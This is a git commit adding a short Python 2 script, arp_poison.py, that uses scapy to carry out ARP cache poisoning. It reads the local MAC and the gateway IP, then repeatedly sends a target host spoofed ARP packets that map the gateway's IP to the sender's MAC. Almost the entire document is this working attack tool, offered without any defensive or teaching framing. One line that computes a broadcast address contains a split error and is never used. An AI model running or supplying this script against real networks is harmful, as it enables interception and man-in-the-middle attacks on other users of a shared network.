c45bab82b4a803c3c6b9e22259436a1e81827e61
MinuteMan3378 <imw3378@gmail.com>
2016-08-04 01:06:30 -0700

    arp_poison(relay success)

---
+++ arp_poison/arp_poison.py
@@ -0,0 +1,31 @@
+import netifaces
+import socket
+from scapy.all import *
+import sys
+import time
+
+if len(sys.argv) != 2:
+    print "Who is target?"
+    sys.exit(1)
+
+ifName = netifaces.interfaces()
+ifName = ifName[1]
+
+ifInfo = netifaces.ifaddresses(ifName)
+ifMAC = ifInfo[17][0]['addr']
+ifIP = ifInfo[2][0]['addr']
+
+print "[*] My Interface Name : ", ifName
+print "[*] My IP : ",ifIP 
+print "[*] My MAC : ",ifMAC
+
+gateInfo = netifaces.gateways()
+gateIP = gateInfo['default'][2][0]
+print "[*] Gateway Info : ", gateInfo
+print "[*] Gateway IP : ", gateIP
+
+broadIP = ifIP.replace("."+ifIP.split(',')[-1], '')+".255"
+packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=gateIP,pdst=sys.argv[1])
+sendp(packet, inter=1, loop=1)
+
+	
